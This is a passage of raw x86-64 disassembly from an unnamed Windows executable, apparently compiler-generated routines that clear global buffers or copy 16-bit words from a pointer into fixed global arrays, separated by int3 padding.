   1400094b3:	0f 11 05 e6 77 2b 00 	movups %xmm0,0x2b77e6(%rip)        # 0x1402c0ca0
   1400094ba:	0f 11 05 cf 77 2b 00 	movups %xmm0,0x2b77cf(%rip)        # 0x1402c0c90
   1400094c1:	0f 11 05 b8 77 2b 00 	movups %xmm0,0x2b77b8(%rip)        # 0x1402c0c80
   1400094c8:	48 c7 05 dd 77 2b 00 	movq   $0x0,0x2b77dd(%rip)        # 0x1402c0cb0
   1400094cf:	00 00 00 00 
   1400094d3:	c3                   	ret
   1400094d4:	cc                   	int3
   1400094d5:	cc                   	int3
   1400094d6:	cc                   	int3
   1400094d7:	cc                   	int3
   1400094d8:	cc                   	int3
   1400094d9:	cc                   	int3
   1400094da:	cc                   	int3
   1400094db:	cc                   	int3
   1400094dc:	cc                   	int3
   1400094dd:	cc                   	int3
   1400094de:	cc                   	int3
   1400094df:	cc                   	int3
   1400094e0:	c6 05 11 78 2b 00 01 	movb   $0x1,0x2b7811(%rip)        # 0x1402c0cf8
   1400094e7:	0f b7 01             	movzwl (%rcx),%eax
   1400094ea:	66 89 05 cf 77 2b 00 	mov    %ax,0x2b77cf(%rip)        # 0x1402c0cc0
   1400094f1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400094f5:	66 89 05 c6 77 2b 00 	mov    %ax,0x2b77c6(%rip)        # 0x1402c0cc2
   1400094fc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009500:	66 89 05 bd 77 2b 00 	mov    %ax,0x2b77bd(%rip)        # 0x1402c0cc4
   140009507:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000950b:	66 89 05 b4 77 2b 00 	mov    %ax,0x2b77b4(%rip)        # 0x1402c0cc6
   140009512:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009516:	66 89 05 ab 77 2b 00 	mov    %ax,0x2b77ab(%rip)        # 0x1402c0cc8
   14000951d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009521:	66 89 05 a2 77 2b 00 	mov    %ax,0x2b77a2(%rip)        # 0x1402c0cca
   140009528:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000952c:	66 89 05 99 77 2b 00 	mov    %ax,0x2b7799(%rip)        # 0x1402c0ccc
   140009533:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009537:	66 89 05 90 77 2b 00 	mov    %ax,0x2b7790(%rip)        # 0x1402c0cce
   14000953e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009542:	66 89 05 87 77 2b 00 	mov    %ax,0x2b7787(%rip)        # 0x1402c0cd0
   140009549:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000954d:	66 89 05 7e 77 2b 00 	mov    %ax,0x2b777e(%rip)        # 0x1402c0cd2
   140009554:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009558:	66 89 05 75 77 2b 00 	mov    %ax,0x2b7775(%rip)        # 0x1402c0cd4
   14000955f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009563:	66 89 05 6c 77 2b 00 	mov    %ax,0x2b776c(%rip)        # 0x1402c0cd6
   14000956a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000956e:	66 89 05 63 77 2b 00 	mov    %ax,0x2b7763(%rip)        # 0x1402c0cd8
   140009575:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009579:	66 89 05 5a 77 2b 00 	mov    %ax,0x2b775a(%rip)        # 0x1402c0cda
   140009580:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009584:	66 89 05 51 77 2b 00 	mov    %ax,0x2b7751(%rip)        # 0x1402c0cdc
   14000958b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000958f:	66 89 05 48 77 2b 00 	mov    %ax,0x2b7748(%rip)        # 0x1402c0cde
   140009596:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000959a:	66 89 05 3f 77 2b 00 	mov    %ax,0x2b773f(%rip)        # 0x1402c0ce0
   1400095a1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400095a5:	66 89 05 36 77 2b 00 	mov    %ax,0x2b7736(%rip)        # 0x1402c0ce2
   1400095ac:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400095b0:	66 89 05 2d 77 2b 00 	mov    %ax,0x2b772d(%rip)        # 0x1402c0ce4
   1400095b7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400095bb:	66 89 05 24 77 2b 00 	mov    %ax,0x2b7724(%rip)        # 0x1402c0ce6
   1400095c2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400095c6:	66 89 05 1b 77 2b 00 	mov    %ax,0x2b771b(%rip)        # 0x1402c0ce8
   1400095cd:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   1400095d1:	66 89 05 12 77 2b 00 	mov    %ax,0x2b7712(%rip)        # 0x1402c0cea
   1400095d8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   1400095dc:	66 89 05 09 77 2b 00 	mov    %ax,0x2b7709(%rip)        # 0x1402c0cec
   1400095e3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   1400095e7:	66 89 05 00 77 2b 00 	mov    %ax,0x2b7700(%rip)        # 0x1402c0cee
   1400095ee:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   1400095f2:	66 89 05 f7 76 2b 00 	mov    %ax,0x2b76f7(%rip)        # 0x1402c0cf0
   1400095f9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   1400095fd:	66 89 05 ee 76 2b 00 	mov    %ax,0x2b76ee(%rip)        # 0x1402c0cf2
   140009604:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009608:	66 89 05 e5 76 2b 00 	mov    %ax,0x2b76e5(%rip)        # 0x1402c0cf4
   14000960f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009613:	66 89 05 dc 76 2b 00 	mov    %ax,0x2b76dc(%rip)        # 0x1402c0cf6
   14000961a:	c3                   	ret
   14000961b:	cc                   	int3
   14000961c:	cc                   	int3
   14000961d:	cc                   	int3
   14000961e:	cc                   	int3
   14000961f:	cc                   	int3
   140009620:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009623:	0f 11 05 b6 76 2b 00 	movups %xmm0,0x2b76b6(%rip)        # 0x1402c0ce0
   14000962a:	0f 11 05 9f 76 2b 00 	movups %xmm0,0x2b769f(%rip)        # 0x1402c0cd0
   140009631:	0f 11 05 88 76 2b 00 	movups %xmm0,0x2b7688(%rip)        # 0x1402c0cc0
   140009638:	48 c7 05 ad 76 2b 00 	movq   $0x0,0x2b76ad(%rip)        # 0x1402c0cf0
   14000963f:	00 00 00 00 
   140009643:	c3                   	ret
   140009644:	cc                   	int3
   140009645:	cc                   	int3
   140009646:	cc                   	int3
   140009647:	cc                   	int3
   140009648:	cc                   	int3
   140009649:	cc                   	int3
   14000964a:	cc                   	int3
   14000964b:	cc                   	int3
   14000964c:	cc                   	int3
   14000964d:	cc                   	int3
   14000964e:	cc                   	int3
   14000964f:	cc                   	int3
   140009650:	c6 05 d3 76 2b 00 01 	movb   $0x1,0x2b76d3(%rip)        # 0x1402c0d2a
   140009657:	0f b7 01             	movzwl (%rcx),%eax
   14000965a:	66 89 05 9f 76 2b 00 	mov    %ax,0x2b769f(%rip)        # 0x1402c0d00
   140009661:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009665:	66 89 05 96 76 2b 00 	mov    %ax,0x2b7696(%rip)        # 0x1402c0d02
   14000966c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009670:	66 89 05 8d 76 2b 00 	mov    %ax,0x2b768d(%rip)        # 0x1402c0d04
   140009677:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000967b:	66 89 05 84 76 2b 00 	mov    %ax,0x2b7684(%rip)        # 0x1402c0d06
   140009682:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009686:	66 89 05 7b 76 2b 00 	mov    %ax,0x2b767b(%rip)        # 0x1402c0d08
   14000968d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009691:	66 89 05 72 76 2b 00 	mov    %ax,0x2b7672(%rip)        # 0x1402c0d0a
   140009698:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000969c:	66 89 05 69 76 2b 00 	mov    %ax,0x2b7669(%rip)        # 0x1402c0d0c
   1400096a3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400096a7:	66 89 05 60 76 2b 00 	mov    %ax,0x2b7660(%rip)        # 0x1402c0d0e
   1400096ae:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400096b2:	66 89 05 57 76 2b 00 	mov    %ax,0x2b7657(%rip)        # 0x1402c0d10
   1400096b9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400096bd:	66 89 05 4e 76 2b 00 	mov    %ax,0x2b764e(%rip)        # 0x1402c0d12
   1400096c4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400096c8:	66 89 05 45 76 2b 00 	mov    %ax,0x2b7645(%rip)        # 0x1402c0d14
   1400096cf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400096d3:	66 89 05 3c 76 2b 00 	mov    %ax,0x2b763c(%rip)        # 0x1402c0d16
   1400096da:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400096de:	66 89 05 33 76 2b 00 	mov    %ax,0x2b7633(%rip)        # 0x1402c0d18
   1400096e5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400096e9:	66 89 05 2a 76 2b 00 	mov    %ax,0x2b762a(%rip)        # 0x1402c0d1a
   1400096f0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400096f4:	66 89 05 21 76 2b 00 	mov    %ax,0x2b7621(%rip)        # 0x1402c0d1c
   1400096fb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400096ff:	66 89 05 18 76 2b 00 	mov    %ax,0x2b7618(%rip)        # 0x1402c0d1e
   140009706:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000970a:	66 89 05 0f 76 2b 00 	mov    %ax,0x2b760f(%rip)        # 0x1402c0d20
   140009711:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009715:	66 89 05 06 76 2b 00 	mov    %ax,0x2b7606(%rip)        # 0x1402c0d22
   14000971c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009720:	66 89 05 fd 75 2b 00 	mov    %ax,0x2b75fd(%rip)        # 0x1402c0d24
   140009727:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000972b:	66 89 05 f4 75 2b 00 	mov    %ax,0x2b75f4(%rip)        # 0x1402c0d26
   140009732:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009736:	66 89 05 eb 75 2b 00 	mov    %ax,0x2b75eb(%rip)        # 0x1402c0d28
   14000973d:	c3                   	ret
   14000973e:	cc                   	int3
   14000973f:	cc                   	int3
   140009740:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009743:	0f 11 05 d0 75 2b 00 	movups %xmm0,0x2b75d0(%rip)        # 0x1402c0d1a
   14000974a:	0f 29 05 bf 75 2b 00 	movaps %xmm0,0x2b75bf(%rip)        # 0x1402c0d10
   140009751:	0f 29 05 a8 75 2b 00 	movaps %xmm0,0x2b75a8(%rip)        # 0x1402c0d00
   140009758:	c3                   	ret
   140009759:	cc                   	int3
   14000975a:	cc                   	int3
   14000975b:	cc                   	int3
   14000975c:	cc                   	int3
   14000975d:	cc                   	int3
   14000975e:	cc                   	int3
   14000975f:	cc                   	int3
   140009760:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009763:	0f 29 05 16 76 2b 00 	movaps %xmm0,0x2b7616(%rip)        # 0x1402c0d80
   14000976a:	0f 29 05 ff 75 2b 00 	movaps %xmm0,0x2b75ff(%rip)        # 0x1402c0d70
   140009771:	0f 29 05 e8 75 2b 00 	movaps %xmm0,0x2b75e8(%rip)        # 0x1402c0d60
   140009778:	0f 29 05 d1 75 2b 00 	movaps %xmm0,0x2b75d1(%rip)        # 0x1402c0d50
   14000977f:	0f 29 05 ba 75 2b 00 	movaps %xmm0,0x2b75ba(%rip)        # 0x1402c0d40
   140009786:	0f 29 05 a3 75 2b 00 	movaps %xmm0,0x2b75a3(%rip)        # 0x1402c0d30
   14000978d:	66 c7 05 fa 75 2b 00 	movw   $0x0,0x2b75fa(%rip)        # 0x1402c0d90
   140009794:	00 00 
   140009796:	c3                   	ret
   140009797:	cc                   	int3
   140009798:	cc                   	int3
   140009799:	cc                   	int3
   14000979a:	cc                   	int3
   14000979b:	cc                   	int3
   14000979c:	cc                   	int3
   14000979d:	cc                   	int3
   14000979e:	cc                   	int3
   14000979f:	cc                   	int3
   1400097a0:	c6 05 1b 76 2b 00 01 	movb   $0x1,0x2b761b(%rip)        # 0x1402c0dc2
   1400097a7:	0f b7 01             	movzwl (%rcx),%eax
   1400097aa:	66 89 05 ef 75 2b 00 	mov    %ax,0x2b75ef(%rip)        # 0x1402c0da0
   1400097b1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400097b5:	66 89 05 e6 75 2b 00 	mov    %ax,0x2b75e6(%rip)        # 0x1402c0da2
   1400097bc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400097c0:	66 89 05 dd 75 2b 00 	mov    %ax,0x2b75dd(%rip)        # 0x1402c0da4
   1400097c7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400097cb:	66 89 05 d4 75 2b 00 	mov    %ax,0x2b75d4(%rip)        # 0x1402c0da6
   1400097d2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400097d6:	66 89 05 cb 75 2b 00 	mov    %ax,0x2b75cb(%rip)        # 0x1402c0da8
   1400097dd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400097e1:	66 89 05 c2 75 2b 00 	mov    %ax,0x2b75c2(%rip)        # 0x1402c0daa
   1400097e8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400097ec:	66 89 05 b9 75 2b 00 	mov    %ax,0x2b75b9(%rip)        # 0x1402c0dac
   1400097f3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400097f7:	66 89 05 b0 75 2b 00 	mov    %ax,0x2b75b0(%rip)        # 0x1402c0dae
   1400097fe:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009802:	66 89 05 a7 75 2b 00 	mov    %ax,0x2b75a7(%rip)        # 0x1402c0db0
   140009809:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000980d:	66 89 05 9e 75 2b 00 	mov    %ax,0x2b759e(%rip)        # 0x1402c0db2
   140009814:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009818:	66 89 05 95 75 2b 00 	mov    %ax,0x2b7595(%rip)        # 0x1402c0db4
   14000981f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009823:	66 89 05 8c 75 2b 00 	mov    %ax,0x2b758c(%rip)        # 0x1402c0db6
   14000982a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000982e:	66 89 05 83 75 2b 00 	mov    %ax,0x2b7583(%rip)        # 0x1402c0db8
   140009835:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009839:	66 89 05 7a 75 2b 00 	mov    %ax,0x2b757a(%rip)        # 0x1402c0dba
   140009840:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009844:	66 89 05 71 75 2b 00 	mov    %ax,0x2b7571(%rip)        # 0x1402c0dbc
   14000984b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000984f:	66 89 05 68 75 2b 00 	mov    %ax,0x2b7568(%rip)        # 0x1402c0dbe
   140009856:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000985a:	66 89 05 5f 75 2b 00 	mov    %ax,0x2b755f(%rip)        # 0x1402c0dc0
   140009861:	c3                   	ret
   140009862:	cc                   	int3
   140009863:	cc                   	int3
   140009864:	cc                   	int3
   140009865:	cc                   	int3
   140009866:	cc                   	int3
   140009867:	cc                   	int3
   140009868:	cc                   	int3
   140009869:	cc                   	int3
   14000986a:	cc                   	int3
   14000986b:	cc                   	int3
   14000986c:	cc                   	int3
   14000986d:	cc                   	int3
   14000986e:	cc                   	int3
   14000986f:	cc                   	int3
   140009870:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009873:	0f 29 05 36 75 2b 00 	movaps %xmm0,0x2b7536(%rip)        # 0x1402c0db0
   14000987a:	0f 29 05 1f 75 2b 00 	movaps %xmm0,0x2b751f(%rip)        # 0x1402c0da0
   140009881:	66 c7 05 36 75 2b 00 	movw   $0x0,0x2b7536(%rip)        # 0x1402c0dc0
   140009888:	00 00 
   14000988a:	c3                   	ret
   14000988b:	cc                   	int3
   14000988c:	cc                   	int3
   14000988d:	cc                   	int3
   14000988e:	cc                   	int3
   14000988f:	cc                   	int3
   140009890:	c6 05 61 75 2b 00 01 	movb   $0x1,0x2b7561(%rip)        # 0x1402c0df8
   140009897:	0f b7 01             	movzwl (%rcx),%eax
   14000989a:	66 89 05 2f 75 2b 00 	mov    %ax,0x2b752f(%rip)        # 0x1402c0dd0
   1400098a1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400098a5:	66 89 05 26 75 2b 00 	mov    %ax,0x2b7526(%rip)        # 0x1402c0dd2
   1400098ac:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400098b0:	66 89 05 1d 75 2b 00 	mov    %ax,0x2b751d(%rip)        # 0x1402c0dd4
   1400098b7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400098bb:	66 89 05 14 75 2b 00 	mov    %ax,0x2b7514(%rip)        # 0x1402c0dd6
   1400098c2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400098c6:	66 89 05 0b 75 2b 00 	mov    %ax,0x2b750b(%rip)        # 0x1402c0dd8
   1400098cd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400098d1:	66 89 05 02 75 2b 00 	mov    %ax,0x2b7502(%rip)        # 0x1402c0dda
   1400098d8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400098dc:	66 89 05 f9 74 2b 00 	mov    %ax,0x2b74f9(%rip)        # 0x1402c0ddc
   1400098e3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400098e7:	66 89 05 f0 74 2b 00 	mov    %ax,0x2b74f0(%rip)        # 0x1402c0dde
   1400098ee:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400098f2:	66 89 05 e7 74 2b 00 	mov    %ax,0x2b74e7(%rip)        # 0x1402c0de0
   1400098f9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400098fd:	66 89 05 de 74 2b 00 	mov    %ax,0x2b74de(%rip)        # 0x1402c0de2
   140009904:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009908:	66 89 05 d5 74 2b 00 	mov    %ax,0x2b74d5(%rip)        # 0x1402c0de4
   14000990f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009913:	66 89 05 cc 74 2b 00 	mov    %ax,0x2b74cc(%rip)        # 0x1402c0de6
   14000991a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000991e:	66 89 05 c3 74 2b 00 	mov    %ax,0x2b74c3(%rip)        # 0x1402c0de8
   140009925:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009929:	66 89 05 ba 74 2b 00 	mov    %ax,0x2b74ba(%rip)        # 0x1402c0dea
   140009930:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009934:	66 89 05 b1 74 2b 00 	mov    %ax,0x2b74b1(%rip)        # 0x1402c0dec
   14000993b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000993f:	66 89 05 a8 74 2b 00 	mov    %ax,0x2b74a8(%rip)        # 0x1402c0dee
   140009946:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000994a:	66 89 05 9f 74 2b 00 	mov    %ax,0x2b749f(%rip)        # 0x1402c0df0
   140009951:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009955:	66 89 05 96 74 2b 00 	mov    %ax,0x2b7496(%rip)        # 0x1402c0df2
   14000995c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009960:	66 89 05 8d 74 2b 00 	mov    %ax,0x2b748d(%rip)        # 0x1402c0df4
   140009967:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000996b:	66 89 05 84 74 2b 00 	mov    %ax,0x2b7484(%rip)        # 0x1402c0df6
   140009972:	c3                   	ret
   140009973:	cc                   	int3
   140009974:	cc                   	int3
   140009975:	cc                   	int3
   140009976:	cc                   	int3
   140009977:	cc                   	int3
   140009978:	cc                   	int3
   140009979:	cc                   	int3
   14000997a:	cc                   	int3
   14000997b:	cc                   	int3
   14000997c:	cc                   	int3
   14000997d:	cc                   	int3
   14000997e:	cc                   	int3
   14000997f:	cc                   	int3
   140009980:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009983:	0f 29 05 56 74 2b 00 	movaps %xmm0,0x2b7456(%rip)        # 0x1402c0de0
   14000998a:	0f 29 05 3f 74 2b 00 	movaps %xmm0,0x2b743f(%rip)        # 0x1402c0dd0
   140009991:	48 c7 05 54 74 2b 00 	movq   $0x0,0x2b7454(%rip)        # 0x1402c0df0
   140009998:	00 00 00 00 
   14000999c:	c3                   	ret
   14000999d:	cc                   	int3
   14000999e:	cc                   	int3
   14000999f:	cc                   	int3
   1400099a0:	c6 05 9d 74 2b 00 01 	movb   $0x1,0x2b749d(%rip)        # 0x1402c0e44
   1400099a7:	0f b7 01             	movzwl (%rcx),%eax
   1400099aa:	66 89 05 4f 74 2b 00 	mov    %ax,0x2b744f(%rip)        # 0x1402c0e00
   1400099b1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400099b5:	66 89 05 46 74 2b 00 	mov    %ax,0x2b7446(%rip)        # 0x1402c0e02
   1400099bc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400099c0:	66 89 05 3d 74 2b 00 	mov    %ax,0x2b743d(%rip)        # 0x1402c0e04
   1400099c7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400099cb:	66 89 05 34 74 2b 00 	mov    %ax,0x2b7434(%rip)        # 0x1402c0e06
   1400099d2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400099d6:	66 89 05 2b 74 2b 00 	mov    %ax,0x2b742b(%rip)        # 0x1402c0e08
   1400099dd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400099e1:	66 89 05 22 74 2b 00 	mov    %ax,0x2b7422(%rip)        # 0x1402c0e0a
   1400099e8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400099ec:	66 89 05 19 74 2b 00 	mov    %ax,0x2b7419(%rip)        # 0x1402c0e0c
   1400099f3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400099f7:	66 89 05 10 74 2b 00 	mov    %ax,0x2b7410(%rip)        # 0x1402c0e0e
   1400099fe:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009a02:	66 89 05 07 74 2b 00 	mov    %ax,0x2b7407(%rip)        # 0x1402c0e10
   140009a09:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140009a0d:	66 89 05 fe 73 2b 00 	mov    %ax,0x2b73fe(%rip)        # 0x1402c0e12
   140009a14:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009a18:	66 89 05 f5 73 2b 00 	mov    %ax,0x2b73f5(%rip)        # 0x1402c0e14
   140009a1f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009a23:	66 89 05 ec 73 2b 00 	mov    %ax,0x2b73ec(%rip)        # 0x1402c0e16
   140009a2a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140009a2e:	66 89 05 e3 73 2b 00 	mov    %ax,0x2b73e3(%rip)        # 0x1402c0e18
   140009a35:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009a39:	66 89 05 da 73 2b 00 	mov    %ax,0x2b73da(%rip)        # 0x1402c0e1a
   140009a40:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009a44:	66 89 05 d1 73 2b 00 	mov    %ax,0x2b73d1(%rip)        # 0x1402c0e1c
   140009a4b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140009a4f:	66 89 05 c8 73 2b 00 	mov    %ax,0x2b73c8(%rip)        # 0x1402c0e1e
   140009a56:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140009a5a:	66 89 05 bf 73 2b 00 	mov    %ax,0x2b73bf(%rip)        # 0x1402c0e20
   140009a61:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009a65:	66 89 05 b6 73 2b 00 	mov    %ax,0x2b73b6(%rip)        # 0x1402c0e22
   140009a6c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009a70:	66 89 05 ad 73 2b 00 	mov    %ax,0x2b73ad(%rip)        # 0x1402c0e24
   140009a77:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140009a7b:	66 89 05 a4 73 2b 00 	mov    %ax,0x2b73a4(%rip)        # 0x1402c0e26
   140009a82:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009a86:	66 89 05 9b 73 2b 00 	mov    %ax,0x2b739b(%rip)        # 0x1402c0e28
   140009a8d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009a91:	66 89 05 92 73 2b 00 	mov    %ax,0x2b7392(%rip)        # 0x1402c0e2a
   140009a98:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140009a9c:	66 89 05 89 73 2b 00 	mov    %ax,0x2b7389(%rip)        # 0x1402c0e2c
   140009aa3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009aa7:	66 89 05 80 73 2b 00 	mov    %ax,0x2b7380(%rip)        # 0x1402c0e2e
   140009aae:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009ab2:	66 89 05 77 73 2b 00 	mov    %ax,0x2b7377(%rip)        # 0x1402c0e30
   140009ab9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140009abd:	66 89 05 6e 73 2b 00 	mov    %ax,0x2b736e(%rip)        # 0x1402c0e32
   140009ac4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009ac8:	66 89 05 65 73 2b 00 	mov    %ax,0x2b7365(%rip)        # 0x1402c0e34
   140009acf:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009ad3:	66 89 05 5c 73 2b 00 	mov    %ax,0x2b735c(%rip)        # 0x1402c0e36
   140009ada:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140009ade:	66 89 05 53 73 2b 00 	mov    %ax,0x2b7353(%rip)        # 0x1402c0e38
   140009ae5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140009ae9:	66 89 05 4a 73 2b 00 	mov    %ax,0x2b734a(%rip)        # 0x1402c0e3a
   140009af0:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140009af4:	66 89 05 41 73 2b 00 	mov    %ax,0x2b7341(%rip)        # 0x1402c0e3c
   140009afb:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   140009aff:	66 89 05 38 73 2b 00 	mov    %ax,0x2b7338(%rip)        # 0x1402c0e3e
   140009b06:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   140009b0a:	66 89 05 2f 73 2b 00 	mov    %ax,0x2b732f(%rip)        # 0x1402c0e40
   140009b11:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   140009b15:	66 89 05 26 73 2b 00 	mov    %ax,0x2b7326(%rip)        # 0x1402c0e42
   140009b1c:	c3                   	ret
   140009b1d:	cc                   	int3
   140009b1e:	cc                   	int3
   140009b1f:	cc                   	int3
   140009b20:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009b23:	0f 29 05 06 73 2b 00 	movaps %xmm0,0x2b7306(%rip)        # 0x1402c0e30
   140009b2a:	0f 29 05 ef 72 2b 00 	movaps %xmm0,0x2b72ef(%rip)        # 0x1402c0e20
   140009b31:	0f 29 05 d8 72 2b 00 	movaps %xmm0,0x2b72d8(%rip)        # 0x1402c0e10
   140009b38:	0f 29 05 c1 72 2b 00 	movaps %xmm0,0x2b72c1(%rip)        # 0x1402c0e00
   140009b3f:	c7 05 f7 72 2b 00 00 	movl   $0x0,0x2b72f7(%rip)        # 0x1402c0e40
   140009b46:	00 00 00 
   140009b49:	c3                   	ret
   140009b4a:	cc                   	int3
   140009b4b:	cc                   	int3
   140009b4c:	cc                   	int3
   140009b4d:	cc                   	int3
   140009b4e:	cc                   	int3
   140009b4f:	cc                   	int3
   140009b50:	c7 05 f6 72 2b 00 00 	movl   $0x0,0x2b72f6(%rip)        # 0x1402c0e50
   140009b57:	00 00 00 
   140009b5a:	48 c7 05 e3 72 2b 00 	movq   $0x0,0x2b72e3(%rip)        # 0x1402c0e48
   140009b61:	00 00 00 00 
   140009b65:	c3                   	ret
   140009b66:	cc                   	int3
   140009b67:	cc                   	int3
   140009b68:	cc                   	int3
   140009b69:	cc                   	int3
   140009b6a:	cc                   	int3
   140009b6b:	cc                   	int3
   140009b6c:	cc                   	int3
   140009b6d:	cc                   	int3
   140009b6e:	cc                   	int3
   140009b6f:	cc                   	int3
   140009b70:	c6 05 0d 73 2b 00 01 	movb   $0x1,0x2b730d(%rip)        # 0x1402c0e84
   140009b77:	0f b7 01             	movzwl (%rcx),%eax
